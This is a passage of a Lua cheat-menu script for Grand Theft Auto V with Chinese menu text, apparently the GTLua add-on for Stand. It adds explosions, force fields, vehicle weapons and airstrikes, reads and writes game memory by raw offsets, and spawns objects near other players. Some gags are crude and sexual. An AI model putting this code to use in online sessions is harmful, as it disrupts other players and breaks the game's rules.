    GRAPHICS.SET_PARTICLE_FX_NON_LOOPED_COLOUR(colour.r, colour.g, colour.b)
    GRAPHICS.START_NETWORKED_PARTICLE_FX_NON_LOOPED_ON_ENTITY(
        effect.name,
        localPed,
        0.0, 0.0, -1,
        0.0, 0.0, 0.0,
        0.09,
        false, false, false)
    GRAPHICS.USE_PARTICLE_FX_ASSET(effect.asset)
    GRAPHICS.SET_PARTICLE_FX_NON_LOOPED_COLOUR(colour2.r, colour2.g, colour2.b)
    GRAPHICS.START_NETWORKED_PARTICLE_FX_NON_LOOPED_ON_ENTITY(
        effect.name,
        localPed,
        0.0, 0.0, -2.9,
        0.0, 0.0, 0.0,
        1.0,
        false, false, false)
end
function personllightc()
    local localPed = PLAYER.PLAYER_PED_ID()
    local effect = Effect.new("scr_xs_props", "scr_xs_exp_mine_sf")
    local colour = Colour.new(5, 0, 0, 30)
    local colour2 = Colour.new(5, 50, 10, 30)
    request_fx_asset(effect.asset)
    GRAPHICS.USE_PARTICLE_FX_ASSET(effect.asset)
    GRAPHICS.SET_PARTICLE_FX_NON_LOOPED_COLOUR(colour.r, colour.g, colour.b)
    GRAPHICS.START_NETWORKED_PARTICLE_FX_NON_LOOPED_ON_ENTITY(effect.name, localPed, 0.0, 0.0, -1, 0.0, 0.0, 0.0, 0.09,
        false, false, false)
    GRAPHICS.USE_PARTICLE_FX_ASSET(effect.asset)
    GRAPHICS.SET_PARTICLE_FX_NON_LOOPED_COLOUR(colour2.r, colour2.g, colour2.b)
    GRAPHICS.START_NETWORKED_PARTICLE_FX_NON_LOOPED_ON_ENTITY(effect.name, localPed, 0.0, 0.0, -2.9, 0.0, 0.0, 0.0, 1.0,
        false, false, false)
end
function supermanpersonl()
    local pWeapon = memory.alloc_int()
    WEAPON.GET_CURRENT_PED_WEAPON(players.user_ped(), pWeapon, 1)
    local weaponHash = memory.read_int(pWeapon)
    if WEAPON.IS_PED_ARMED(players.user_ped(), 1) or weaponHash == util.joaat("weapon_unarmed") then
        local pImpactCoords = v3.new()
        local pos = ENTITY.GET_ENTITY_COORDS(players.user_ped(), false)
        if WEAPON.GET_PED_LAST_WEAPON_IMPACT_COORD(players.user_ped(), pImpactCoords) then
            set_explosion_proof(players.user_ped(), true)
            wait()
            FIRE.ADD_EXPLOSION(pos.x, pos.y, pos.z - 1.0, 29, 5.0, false, true, 0.3, true)
        elseif not FIRE.IS_EXPLOSION_IN_SPHERE(29, pos.x, pos.y, pos.z, 2.0) then
            set_explosion_proof(players.user_ped(), false)
        end
    end
end
function becomepoliceman()
    local p = PLAYER.GET_PLAYER_PED_SCRIPT_INDEX(players.user_ped())
    PED.SET_PED_AS_COP(p, true)
    menu.trigger_commands("smycop01") --model cop
    menu.trigger_commands("police3") --spawn cop car
end
local agroup = "missfbi3ig_0"
local mshit = util.joaat("prop_big_shit_02")
local agroup2 = "switch@trevor@jerking_off"
local cum = util.joaat("p_oil_slick_01")
local anim2 = "trev_jerking_off_loop"
local anim = "shit_loop_trev"
local bigasscircle = util.joaat("ar_prop_ar_neon_gate4x_04a")
local ufo = util.joaat("sum_prop_dufocore_01a")
local num = {"1", "2", "3", "4", "5", "6", "7", "8", "9", "10", "11", "12", "13", "14", "15", "16", "17", "18", "19",
             "20", "21", "22", "23", "24", "25", "26", "27", "28", "29", "30", "31", "32", "33", "34", "35"}
local c1
local c2
local c3
local c4
local c5
local c6
local c7
local c8
local c9
local c10
local c12
local c13
local c14
local c15
local c16
local c17
local c18
local c19
function personlshit() 
    local c = ENTITY.GET_ENTITY_COORDS(players.user_ped())
    c.z = c.z - 1
    while not STREAMING.HAS_ANIM_DICT_LOADED(agroup) do 
        STREAMING.REQUEST_ANIM_DICT(agroup)
        wait()
    end
    NETWORK.NETWORK_REQUEST_CONTROL_OF_ENTITY(players.user_ped())
    TASK.TASK_PLAY_ANIM(players.user_ped(), agroup, anim, 8.0, 8.0, 3000, 0, 0, true, true, true) --play anim
    wait(1000)
    local shit = entities.create_object(mshit, c) --spawn shit
    wait(60000)
    entities.delete_by_handle(shit) --delete shit
end
function personlhitplane() 
    local c = ENTITY.GET_ENTITY_COORDS(players.user_ped())
    c.z = c.z - 1
    while not STREAMING.HAS_ANIM_DICT_LOADED(agroup2) do
        STREAMING.REQUEST_ANIM_DICT(agroup2)
        wait()
    end
    NETWORK.NETWORK_REQUEST_CONTROL_OF_ENTITY(players.user_ped())
    TASK.TASK_PLAY_ANIM(players.user_ped(), agroup2, anim2, 8.0, 8.0, 5000, 1, 0, true, true, true) --play anim
    wait(4500)
    local cum = entities.create_object(cum, c) --spawn cum
    wait(60000)
    entities.delete_by_handle(cum) --delete cum
end
local selectedOpt = 1
options_force  = {"推开", "摧毁"}
function forcefielddd()
    if selectedOpt == 1 then
		local entities = get_entities_in_player_range(players.user(), 10.0)
		local playerPos = players.get_position(players.user())
		for _, entity in ipairs(entities) do
			local entPos = ENTITY.GET_ENTITY_COORDS(entity, false)
			if not (ENTITY.IS_ENTITY_A_PED(entity) and PED.IS_PED_A_PLAYER(entity)) and
			PED.GET_VEHICLE_PED_IS_USING(players.user_ped()) ~= entity and request_control_once(entity) then
				local force = v3.new(entPos)
				force:sub(playerPos)
				force:normalise()
				if ENTITY.IS_ENTITY_A_PED(entity) then PED.SET_PED_TO_RAGDOLL(entity, 1000, 1000, 0, false, false, false) end
				ENTITY.APPLY_FORCE_TO_ENTITY(entity, 3, force.x,force.y,force.z, 0, 0, 0.5, 0, false, false, true, false, false)
			end
		end
	elseif selectedOpt == 2 then
		set_explosion_proof(players.user_ped(), true)
		local pos = ENTITY.GET_ENTITY_COORDS(players.user_ped(), false)
		FIRE.ADD_EXPLOSION(pos.x,pos.y,pos.z, 29, 5.0, false, true, 0.0, true)
	end
end
function forcefield_set(index)
    selectedOpt = index
end
state = 0
local notif_format = "按 左键 和 右键 来使用原力"
function jedmode()
    if state == 0 then
		notification(notif_format, HudColour.blue, "INPUT_ATTACK", "INPUT_AIM")
		local effect = Effect.new("scr_ie_tw", "scr_impexp_tw_take_zone")
		local colour = {r = 0.5, g = 0.0, b = 0.5, a = 1.0}
		request_fx_asset(effect.asset)
		GRAPHICS.USE_PARTICLE_FX_ASSET(effect.asset)
		GRAPHICS.SET_PARTICLE_FX_NON_LOOPED_COLOUR(colour.r, colour.g, colour.b)
		GRAPHICS.START_NETWORKED_PARTICLE_FX_NON_LOOPED_ON_ENTITY(
			effect.name, players.user_ped(), 0.0, 0.0, -0.9,1.0, 1.0,1, 1.0, false, false, false
		)
		state = 1
	elseif state == 1 then
		PLAYER.DISABLE_PLAYER_FIRING(players.user(), true)
		PAD.DISABLE_CONTROL_ACTION(0, 25, true)
		PAD.DISABLE_CONTROL_ACTION(0, 68, true)
		PAD.DISABLE_CONTROL_ACTION(0, 91, true)
		local entities = get_ped_nearby_vehicles(players.user_ped())
		for _, vehicle in ipairs(entities) do
			if PED.IS_PED_IN_ANY_VEHICLE(players.user_ped(), false) and
			PED.GET_VEHICLE_PED_IS_IN(players.user_ped(), false) == vehicle then
				continue
			end
			if PAD.IS_DISABLED_CONTROL_PRESSED(0, 24) and
			request_control_once(vehicle) then
				ENTITY.APPLY_FORCE_TO_ENTITY(vehicle, 1, 0.0, 0.0, 0.5, 1.0, 1.0,1, 0, false, false, true, false, false)
			elseif PAD.IS_DISABLED_CONTROL_PRESSED(0, 25) and
			request_control_once(vehicle) then
				ENTITY.APPLY_FORCE_TO_ENTITY(vehicle, 1, 0.0, 0.0, -70.0,1.0, 1.0,1, 0, false, false, true, false, false)
			end
		end
	end
end
object = 0
local format0 = "按WASD来使用地毯式移动"
local format1 = "按Shift以移动得更快\n按空格上升,按Ctrl下降"
function carpetridexx()
    if state == 0 then
        local objHash = util.joaat("p_cs_beachtowel_01_s")
        request_model(objHash)
        STREAMING.REQUEST_ANIM_DICT("rcmcollect_paperleadinout@")
        while not STREAMING.HAS_ANIM_DICT_LOADED("rcmcollect_paperleadinout@") do
            wait()
        end
        local localPed = players.user_ped()
        local pos = ENTITY.GET_ENTITY_COORDS(localPed, false)
        TASK.CLEAR_PED_TASKS_IMMEDIATELY(localPed)
        object = entities.create_object(objHash, pos)
        ENTITY.ATTACH_ENTITY_TO_ENTITY(localPed, object, 0, 0, -0.2, 1.0, 1.0, 1.0, 1, false, true, false, false, 0,
            true, false)
        ENTITY.SET_ENTITY_COMPLETELY_DISABLE_COLLISION(object, false, false)
        TASK.TASK_PLAY_ANIM(localPed, "rcmcollect_paperleadinout@", "meditiate_idle", 8.0, -8.0, -1, 1, 0.0, false,
            false, false)
        notification(format0 .. ".\n" .. format1 .. '.', HudColour.black, "INPUT_MOVE_UP_ONLY", "INPUT_MOVE_DOWN_ONLY",
            "INPUT_VEH_JUMP", "INPUT_DUCK", "INPUT_VEH_MOVE_UP_ONLY")
        state = 1
    elseif state == 1 then
        HUD.DISPLAY_SNIPER_SCOPE_THIS_FRAME()
        local objPos = ENTITY.GET_ENTITY_COORDS(object, false)
        local camrot = CAM.GET_GAMEPLAY_CAM_ROT(0)
        ENTITY.SET_ENTITY_ROTATION(object, 0, 0, camrot.z, 0, true)
        local forwardV = ENTITY.GET_ENTITY_FORWARD_VECTOR(players.user_ped())
        forwardV.z = 0.0
        local delta = v3.new(0, 0, 0)
        local speed = 0.2
        if PAD.IS_CONTROL_PRESSED(0, 61) then
            speed = 1.5
        end
        if PAD.IS_CONTROL_PRESSED(0, 32) then
            delta = v3.new(forwardV)
            delta:mul(speed)
        end
        if PAD.IS_CONTROL_PRESSED(0, 130) then
            delta = v3.new(forwardV)
            delta:mul(-speed)
        end
        if PAD.IS_DISABLED_CONTROL_PRESSED(0, 22) then
            delta.z = speed
        end
        if PAD.IS_CONTROL_PRESSED(0, 36) then
            delta.z = -speed
        end
        local newPos = v3.new(objPos)
        newPos:add(delta)
        ENTITY.SET_ENTITY_COORDS(object, newPos.x, newPos.y, newPos.z, false, false, false, false)
    end
end
-- 待修复
function fingergun()
    for id, data in pairs(weapon_stuff) do
        local name = data[1]
        local weapon_name = data[2]
        local projectile = util.joaat(weapon_name)
        while not WEAPON.HAS_WEAPON_ASSET_LOADED(projectile) do
            WEAPON.REQUEST_WEAPON_ASSET(projectile, 31, false)
            wait(10)
        end
        menu.toggle(finger_thing, name, {}, "", function(state)
            toggled = state
            while toggled do
                if memory.read_int(memory.script_global(4521801 + 932)) == 3 then
                    memory.write_int(memory.script_global(4521801 + 937), NETWORK.GET_NETWORK_TIME())
                    local inst = v3.new()
                    v3.set(inst, CAM.GET_FINAL_RENDERED_CAM_ROT(2))
                    local tmp = v3.toDir(inst)
                    v3.set(inst, v3.get(tmp))
                    v3.mul(inst, 1000)
                    v3.set(tmp, CAM.GET_FINAL_RENDERED_CAM_COORD())
                    v3.add(inst, tmp)
                    local x, y, z = v3.get(inst)
                    local fingerPos = PED.GET_PED_BONE_COORDS(players.user_ped(), 0xff9, 1.0, 0, 0)
                    MISC.SHOOT_SINGLE_BULLET_BETWEEN_COORDS_IGNORE_ENTITY(fingerPos.x, fingerPos.y, fingerPos.z, x, y,
                        z, 1, true, projectile, 0, true, false, 500.0, players.user_ped(), 0)
                end
                wait(100)
            end
            local pos = ENTITY.GET_ENTITY_COORDS(players.user_ped())
            MISC.CLEAR_AREA_OF_PROJECTILES(pos.x, pos.y, pos.z, 999999, 0)
        end)
    end
end
function bigpussy()
    if state == 0 then
		local objHash <const> = util.joaat("apa_mp_apa_y1_l1a")
		request_model(objHash)
		STREAMING.REQUEST_ANIM_DICT("rcmcollect_paperleadinout@")
		while not STREAMING.HAS_ANIM_DICT_LOADED("rcmcollect_paperleadinout@") do
			wait()
		end
		local localPed = PLAYER.PLAYER_PED_ID()
		local pos = ENTITY.GET_ENTITY_COORDS(localPed)
		TASK.CLEAR_PED_TASKS_IMMEDIATELY(localPed)
		object = entities.create_object(objHash, pos)
		ENTITY.ATTACH_ENTITY_TO_ENTITY(localPed, object, 0, 0, 4, 1.0, 0, 0, 0, false, true, false, false, 0, true)
		ENTITY.SET_ENTITY_COMPLETELY_DISABLE_COLLISION(object, false, false)	
		state = 1
	elseif state == 1 then
		HUD.DISPLAY_SNIPER_SCOPE_THIS_FRAME()
		local objPos = ENTITY.GET_ENTITY_COORDS(object)
		local camrot = CAM.GET_GAMEPLAY_CAM_ROT(0)
		ENTITY.SET_ENTITY_ROTATION(object, camrot.x, camrot.y, camrot.z, 0, true)
		local forwardV = ENTITY.GET_ENTITY_FORWARD_VECTOR(PLAYER.PLAYER_PED_ID())
		forwardV.z = 0.0
		local delta = v3.new(0, 0, 0)
		local speed = 0.2
		local newPos = v3.new(objPos)
		newPos:add(delta)
		ENTITY.SET_ENTITY_COORDS(object, newPos.x, newPos.y, newPos.z, false, false, false, false)
	end
end
------------------------------------
-------------视觉效果---------------
------------------------------------
function drunkmode(val)
    if val > 0 then
        CAM.SHAKE_GAMEPLAY_CAM("DRUNK_SHAKE", val)
        GRAPHICS.SET_TIMECYCLE_MODIFIER("Drunk")
    else
        GRAPHICS.SET_TIMECYCLE_MODIFIER("DEFAULT")
        CAM.SHAKE_GAMEPLAY_CAM("DRUNK_SHAKE", 0)
    end
end
function visual_setting()
    local visions = menu.list(visuals, "屏幕效果", {""}, "")
for id, data in pairs(effect_stuff) do
    local effect_name = data[1]
    local effect_thing = data[2]
    menu.toggle(visions, effect_name, {"screenvisual"}, "", function(toggled)
        if toggled then
            GRAPHICS.ANIMPOSTFX_PLAY(effect_thing, 5, true)
        else
            GRAPHICS.ANIMPOSTFX_STOP_ALL()
        end
    end)
end
local visual_fidelity = menu.list(visuals, "视觉增强", {}, "")
for id, data in pairs(visual_stuff) do
    local effect_name = data[1]
    local effect_thing = data[2]
    menu.toggle(visual_fidelity, effect_name, {""}, "", function(toggled)
        if toggled then
            GRAPHICS.SET_TIMECYCLE_MODIFIER(effect_thing)
            menu.trigger_commands("shader off")
        else
            GRAPHICS.SET_TIMECYCLE_MODIFIER("DEFAULT")
        end
    end)
end
local drug_mode = menu.list(visuals, "药物过滤器", {}, "")
for id, data in pairs(drugged_effects) do
    menu.toggle(drug_mode, data, {}, "", function(toggled)
        if toggled then
            GRAPHICS.SET_TIMECYCLE_MODIFIER(data)
            menu.trigger_commands("shader off")
        else
            GRAPHICS.SET_TIMECYCLE_MODIFIER("DEFAULT")
        end
    end)
end
end
------------------------------------
-------------载具选项---------------
------------------------------------
local get_vehicle_cam_relative_heading = function(vehicle)
	local camDir = CAM.GET_GAMEPLAY_CAM_ROT(0):toDir()
	local fwdVector = ENTITY.GET_ENTITY_FORWARD_VECTOR(vehicle)
	camDir.z, fwdVector.z = 0.0, 0.0
	local angle = math.acos(fwdVector:dot(camDir) / (#camDir * #fwdVector))
	return math.deg(angle)
end
local shoot_from_vehicle = function (vehicle, damage, weaponHash, ownerPed, isAudible, isVisible, speed, target, position)
	local min, max = v3.new(), v3.new()
	local offset
	MISC.GET_MODEL_DIMENSIONS(ENTITY.GET_ENTITY_MODEL(vehicle), min, max)
	if position == 0 then
		offset = v3.new(min.x, max.y + 0.25, 0.3)
	elseif position == 1 then
		offset = v3.new(min.x, min.y, 0.3)
	elseif position == 2 then
		offset = v3.new(max.x, max.y + 0.25, 0.3)
	elseif position == 3 then
		offset = v3.new(max.x, min.y, 0.3)
	else
		error("得到了意想不到的位置")
	end
	local a = ENTITY.GET_OFFSET_FROM_ENTITY_IN_WORLD_COORDS(vehicle, offset.x, offset.y, offset.z)
	local direction = ENTITY.GET_ENTITY_ROTATION(vehicle, 2):toDir()
	if get_vehicle_cam_relative_heading(vehicle) > 95.0 then
		direction:mul(-1)
	end
	local b = v3.new(direction)
	b:mul(300.0); b:add(a)
	MISC.SHOOT_SINGLE_BULLET_BETWEEN_COORDS_IGNORE_ENTITY_NEW(
		a.x, a.y, a.z,
		b.x, b.y, b.z,
		damage,
		true,
		weaponHash,
		ownerPed,
		isAudible,
		not isVisible,
		speed,
		vehicle,
		false, false, target, false, 0, 0, 0
	)
end
function vehlaser()
    if PED.IS_PED_IN_ANY_VEHICLE(players.user_ped(), false) then
		local vehicle = get_vehicle_player_is_in(players.user())
		local min, max = v3.new(), v3.new()
		MISC.GET_MODEL_DIMENSIONS(ENTITY.GET_ENTITY_MODEL(vehicle), min, max)
		local startLeft = ENTITY.GET_OFFSET_FROM_ENTITY_IN_WORLD_COORDS(vehicle,  min.x, max.y, 0.0)
		local endLeft = ENTITY.GET_OFFSET_FROM_ENTITY_IN_WORLD_COORDS(vehicle, min.x, max.y + 25.0, 0.0)
		GRAPHICS.DRAW_LINE(startLeft.x, startLeft.y, startLeft.z, endLeft.x, endLeft.y, endLeft.z, 255, 0, 0, 150)
		local startRight = ENTITY.GET_OFFSET_FROM_ENTITY_IN_WORLD_COORDS(vehicle, max.x, max.y, 0.0)
		local endRight = ENTITY.GET_OFFSET_FROM_ENTITY_IN_WORLD_COORDS(vehicle, max.x, max.y + 25.0, 0)
		GRAPHICS.DRAW_LINE(startRight.x, startRight.y, startRight.z, endRight.x, endRight.y, endRight.z, 255, 0, 0, 150)
	end
end
VehicleWeapon = {modelName = "", timeBetweenShots = 0}
VehicleWeapon.__index = VehicleWeapon
function VehicleWeapon.new(modelName, timeBetweenShots)
	local instance = setmetatable({}, VehicleWeapon)
	instance.modelName = modelName
	instance.timeBetweenShots = timeBetweenShots
	return instance
end
G = GTluaScript.attach_before(GTluaScript.ref_by_path('Stand>Settings'),GTluaScript.list(GTluaScript.shadow_root(), 'GTLua Standard '..GT_version, {"GTLuaScript"}, 'GRANDTOURINGVIP YYDS ! ! !', 
function()end))
GTluaScript.trigger_commands("GTLuaScript")
-- for _,id in ipairs(spid) do
--     if players.get_name(players.user()) == id.playerid then
--         menu.set_menu_name(G, "GTLua Pro VIP "..GT_version)
--     end
-- end
-- for _,id in ipairs(sxid) do
--     if players.get_name(players.user()) == id.playeridx then
--         menu.set_menu_name(G, "GTLua Ultra VIP "..GT_version)
--     end
-- end
-- for _,id in ipairs(devid) do
--     if players.get_name(players.user()) == id.playerrid then
menu.set_menu_name(G, "GTLua Developer "..GT_version)
--     end
-- end
local vehicleWeaponList <const> = {
	VehicleWeapon.new("weapon_vehicle_rocket", 220),
	VehicleWeapon.new("weapon_raypistol", 50),
	VehicleWeapon.new("weapon_firework", 220),
	VehicleWeapon.new("vehicle_weapon_tank", 220),
	VehicleWeapon.new("vehicle_weapon_player_lazer", 30)
}
state = 0
local timer <const> = newTimer()
local msg = "按 ~%s~ 使用载具武器"
function vehweapon_veh()
    local control = Config.controls.vehicleweapons
	if state == 0 or timer.elapsed() > 120000 then
		local controlName = table.find_if(Imputs_vehweapon, function(k, tbl)
			return tbl[2] == control
		end)
		assert(controlName, "未找到控件名称")
		util.show_corner_help(msg:format(controlName))
		state = 1
		timer.reset()
	end
	local selectedWeapon = vehicleWeaponList[selectedOpt]
	local vehicle = get_vehicle_player_is_in(players.user())
	local weaponHash <const> = util.joaat(selectedWeapon.modelName)
	request_weapon_asset(weaponHash)
	if not ENTITY.DOES_ENTITY_EXIST(vehicle) or not PAD.IS_CONTROL_PRESSED(0, control) or
	timer.elapsed() < selectedWeapon.timeBetweenShots then
		return
	elseif get_vehicle_cam_relative_heading(vehicle) < 95.0 then
		shoot_from_vehicle(vehicle, 200, weaponHash, players.user_ped(), true, true, 2000.0, 0, 0)
		shoot_from_vehicle(vehicle, 200, weaponHash, players.user_ped(), true, true, 2000.0, 0, 2)
		timer.reset()
	else
		shoot_from_vehicle(vehicle, 200, weaponHash, players.user_ped(), true, true, 2000.0, 0, 1)
		shoot_from_vehicle(vehicle, 200, weaponHash, players.user_ped(), true, true, 2000.0, 0, 3)
		timer.reset()
	end
end
function setvehweapon(index)
    selectedOpt = index 
end
state = 0
local hash_plane = util.joaat("weapon_airstrike_rocket")
local trans =
{
	MenuName = "空袭飞机",
	Help = "使用任何飞机或直升机进行空袭",
	CornerHelp = "按 ~%s~ 以使用空袭飞机",
	Notification = "空袭飞机可用于飞机和直升机",
	HelpText = "空袭飞机可用于飞机和直升机",
}
function airstrikeaicraft_plane()
local control = Config.controls.airstrikeaircraft
if state == 0 then
    local action_name = table.find_if(Imputs_vehweapon, function (k, tbl)
        return tbl[2] == control
    end)
    assert(action_name, "control name not found")
    notification("空袭飞机可用于飞机和直升机")
    util.show_corner_help(trans.CornerHelp:format(action_name))
    state = 1
end
if PED.IS_PED_IN_FLYING_VEHICLE(players.user_ped()) and PAD.IS_CONTROL_PRESSED(2, control) and
timer.elapsed() > 800 then
    local vehicle = PED.GET_VEHICLE_PED_IS_IN(players.user_ped(), false)
    local vehPos = ENTITY.GET_ENTITY_COORDS(vehicle, false)
    local groundZ = get_ground_z(vehPos)
    local startTime = newTimer()
    util.create_tick_handler(function()
        wait(500)
        if vehPos.z - groundZ < 10.0 then
            return false
        end
        local pos = get_random_offset_in_range(vehPos, 0.0, 5.0)
        MISC.SHOOT_SINGLE_BULLET_BETWEEN_COORDS(
            pos.x, pos.y, pos.z - 3.0,
            pos.x, pos.y, groundZ,
            200,
            true,
            hash_plane,
            players.user_ped(), true, false, 1000.0
        )
        return startTime.elapsed() < 5000
    end)
    timer.reset()
    end
end
local NULL <const> = 0
subHandlingClasses =
{
	[0]  = "CBikeHandlingData",
	[1]  = "CFlyingHandlingData",
	[2]  = "CFlyingHandlingData2",
	[3]  = "CBoatHandlingData",
	[4]  = "CSeaPlaneHandlingData",
	[5]  = "CSubmarineHandlingData",
	[6]  = "CTrainHandlingData",
	[7]  = "CTrailerHandlingData",
	[8]  = "CCarHandlingData",
	[9]  = "CVehicleWeaponHandlingData",
	[10] = "CSpecialFlightHandlingData",
}
function get_sub_handling_type(subHandling)
	local funAddress = memory.read_long(memory.read_long(subHandling) + 16)
	return util.call_foreign_function(funAddress, subHandling)
end
function get_sub_handling_array(handlingData)
	local subHandlingArray = memory.read_long(handlingData + 0x158)
	local numSubHandling = memory.read_ushort(handlingData + 0x160)
	local arr = {}
	local index = 0
	local t = -1
	while true do
		local subHandling = memory.read_long(subHandlingArray + index * 8)
		if subHandling == NULL then
			goto NotFound
		end
		t = get_sub_handling_type(subHandling)
		if t >= 0 and t <= 10 then
			table.insert(arr, {type = t, address = subHandling})
		end
	::NotFound::
		index = index + 1
		if index >= numSubHandling then break end
	end
	return arr
end
valiases_spawn = {}
function veh_spawn_see()
    local current_preview = nil
    local next_preview
    local image_preview
    local function rotation_to_direction(rotation)
        local adjusted_rotation =
        {
            x = (math.pi / 180) * rotation.x,
            y = (math.pi / 180) * rotation.y,
            z = (math.pi / 180) * rotation.z
        }
        local direction =
        {
            x = -math.sin(adjusted_rotation.z) * math.abs(math.cos(adjusted_rotation.x)),
            y =  math.cos(adjusted_rotation.z) * math.abs(math.cos(adjusted_rotation.x)),
            z =  math.sin(adjusted_rotation.x)
        }
        return direction
    end
    local function get_offset_from_camera(distance)
        local cam_rot = CAM.GET_FINAL_RENDERED_CAM_ROT(0)
        local cam_pos = CAM.GET_FINAL_RENDERED_CAM_COORD()
        local direction = rotation_to_direction(cam_rot)
        local destination =
        {
            x = cam_pos.x + direction.x * distance,
            y = cam_pos.y + direction.y * distance,
            z = cam_pos.z + direction.z * distance
        }
        return destination
    end
    local function update_preview_tick()
        if current_preview ~= nil then
            current_preview.position = get_offset_from_camera(current_preview.camera_distance)
            current_preview.rotation.z = current_preview.rotation.z + 2
            ENTITY.SET_ENTITY_COORDS_NO_OFFSET(
                    current_preview.handle,
                    current_preview.position.x,
                    current_preview.position.y,
                    current_preview.position.z,
                    true, false, false
            )
            ENTITY.SET_ENTITY_ROTATION(
                    current_preview.handle,
                    current_preview.rotation.x,
                    current_preview.rotation.y,
                    current_preview.rotation.z,
                    2, true
            )
            ENTITY.SET_ENTITY_COMPLETELY_DISABLE_COLLISION(current_preview.handle, false, true)
            ENTITY.SET_ENTITY_ALPHA(current_preview.handle, 206, false)
            ENTITY.FREEZE_ENTITY_POSITION(current_preview.handle, true)
        end
    end
    for alias, vehicle in pairs(VEHICLE_ALIASES) do
        local alias_menu_item = menu.action(valiases_spawn.vehicle_aliases, alias, {alias}, "Spawn "..vehicle, function(click_type, pid)
                local targets = PLAYER.GET_PLAYER_PED_SCRIPT_INDEX(pid)
                local tar1 = ENTITY.GET_ENTITY_COORDS(targets, true)
                valiases_spawn.veh = util.joaat(vehicle)
                if valiases_spawn.vehicle_alias then
                    Vspawn(valiases_spawn.veh, tar1, targets, tostring(players.get_name(pid)))
                    else
                        if set.alert then
                            gtoast('未设置车辆生成')
                        end
                end
        end, nil, nil, COMMANDPERM_SPAWN)
        menu.on_focus(alias_menu_item, function ()
            local hash = util.joaat(vehicle)
            Streament(hash)
            local handle = entities.create_vehicle(hash, {x=0, y=0, z=0}, 0)
            if handle then
                ENTITY.SET_ENTITY_COMPLETELY_DISABLE_COLLISION(handle , false, true)
                ENTITY.SET_ENTITY_ALPHA(handle , 206, false)
                ENTITY.FREEZE_ENTITY_POSITION(handle, true)
                current_preview = {
                    handle = handle,
                    position={x=0,y=0,z=0},
                    rotation={x=0,y=0,z=0},
                    camera_distance=5}
            end
        end)
        menu.on_blur(alias_menu_item, function()
          entities.delete_by_handle(current_preview.handle)
          current_preview = nil
        end)
      end
      util.create_tick_handler(function ()
        if current_preview ~= nil then
          update_preview_tick()
        end
    end)
end
function is_player_in_any_interior(player)
	local address = memory.script_global(2657589 + (player * 466 + 1) + 245)
	return address ~= NULL and memory.read_int(address) ~= 0
end
Features = {}
Translation = {}
---@param section string
---@param name string
---@return string
function translate(section, name)
	Features[section] = Features[section] or {}
	Features[section][name] = Features[section][name] or ""
	if Config.general.language == "english" then
		return name
	end
	Translation[section] = Translation[section] or Features[section]
	if not Translation[section][name] then
		Translation[section][name] = ""
		return name
	end
	if Translation[section][name] == "" then
		return name
	end
	return Translation[section][name]
end
-- 伤害数字
b_drawing_funcs = {}
b_drawing_funcs.new = function()
    local self = {}
    self.draw_arrow = function(pos, angle, size, colour_a, colour_b)
        local angle_cos = math.cos(angle)
        local angle_sin = math.sin(angle)
        local width = 0.5 * size
        local length = 1 * size
        local height = 0.25 * size
        GRAPHICS.DRAW_POLY(pos.x + (angle_cos * -width - angle_sin * -length),
            pos.y + (angle_sin * -width + angle_cos * -length), pos.z + 0, pos.x + (angle_cos * 0 - angle_sin * -width),
            pos.y + (angle_sin * 0 + angle_cos * -width), pos.z + -height, pos.x + (angle_cos * 0 - angle_sin * -width),
            pos.y + (angle_sin * 0 + angle_cos * -width), pos.z + height, colour_b.r, colour_b.g, colour_b.b, colour_b.a)
        GRAPHICS.DRAW_POLY(pos.x + (angle_cos * 0 - angle_sin * -width), pos.y + (angle_sin * 0 + angle_cos * -width),
            pos.z + -height, pos.x + (angle_cos * width - angle_sin * -length),
            pos.y + (angle_sin * width + angle_cos * -length), pos.z + 0, pos.x + (angle_cos * 0 - angle_sin * -width),
            pos.y + (angle_sin * 0 + angle_cos * -width), pos.z + height, colour_a.r, colour_a.g, colour_a.b, colour_a.a)
        GRAPHICS.DRAW_POLY(pos.x + (angle_cos * width - angle_sin * -length),
            pos.y + (angle_sin * width + angle_cos * -length), pos.z + 0, pos.x + (angle_cos * 0 - angle_sin * width),
            pos.y + (angle_sin * 0 + angle_cos * width), pos.z + 0, pos.x + (angle_cos * 0 - angle_sin * -width),
            pos.y + (angle_sin * 0 + angle_cos * -width), pos.z + height, colour_a.r, colour_a.g, colour_a.b, colour_a.a)
        GRAPHICS.DRAW_POLY(pos.x + (angle_cos * 0 - angle_sin * width), pos.y + (angle_sin * 0 + angle_cos * width),
            pos.z + 0, pos.x + (angle_cos * width - angle_sin * -length),
            pos.y + (angle_sin * width + angle_cos * -length), pos.z + 0, pos.x + (angle_cos * 0 - angle_sin * -width),
            pos.y + (angle_sin * 0 + angle_cos * -width), pos.z + -height, colour_a.r, colour_a.g, colour_a.b,
            colour_a.a)
        GRAPHICS.DRAW_POLY(pos.x + (angle_cos * -width - angle_sin * -length),
            pos.y + (angle_sin * -width + angle_cos * -length), pos.z + 0, pos.x + (angle_cos * 0 - angle_sin * width),
            pos.y + (angle_sin * 0 + angle_cos * width), pos.z + 0, pos.x + (angle_cos * 0 - angle_sin * -width),
            pos.y + (angle_sin * 0 + angle_cos * -width), pos.z + -height, colour_b.r, colour_b.g, colour_b.b,
            colour_b.a)
        GRAPHICS.DRAW_POLY(pos.x + (angle_cos * 0 - angle_sin * width), pos.y + (angle_sin * 0 + angle_cos * width),
            pos.z + 0, pos.x + (angle_cos * -width - angle_sin * -length),
            pos.y + (angle_sin * -width + angle_cos * -length), pos.z + 0, pos.x + (angle_cos * 0 - angle_sin * -width),
            pos.y + (angle_sin * 0 + angle_cos * -width), pos.z + height, colour_b.r, colour_b.g, colour_b.b, colour_b.a)
    end
    self.draw_arrow_down = function(pos, angle, size, colour_a, colour_b)
        local angle_cos = math.cos(angle)
        local angle_sin = math.sin(angle)
        local width = 0.5 * size
        local length = 1 * size
        local height = 0.25 * size
        GRAPHICS.DRAW_POLY(pos.x + (angle_cos * 0 - angle_sin * 0), pos.y + (angle_sin * 0 + angle_cos * 0), pos.z + 0,
            pos.x + (angle_cos * 0 - angle_sin * height), pos.y + (angle_sin * 0 + angle_cos * height),
            pos.z + length + height, pos.x + (angle_cos * width - angle_sin * 0),
            pos.y + (angle_sin * width + angle_cos * 0), pos.z + length, colour_b.r, colour_b.g, colour_b.b, colour_b.a)
        GRAPHICS.DRAW_POLY(pos.x + (angle_cos * 0 - angle_sin * -height), pos.y + (angle_sin * 0 + angle_cos * -height),
            pos.z + length + height, pos.x + (angle_cos * 0 - angle_sin * 0), pos.y + (angle_sin * 0 + angle_cos * 0),
            pos.z + 0, pos.x + (angle_cos * width - angle_sin * 0), pos.y + (angle_sin * width + angle_cos * 0),
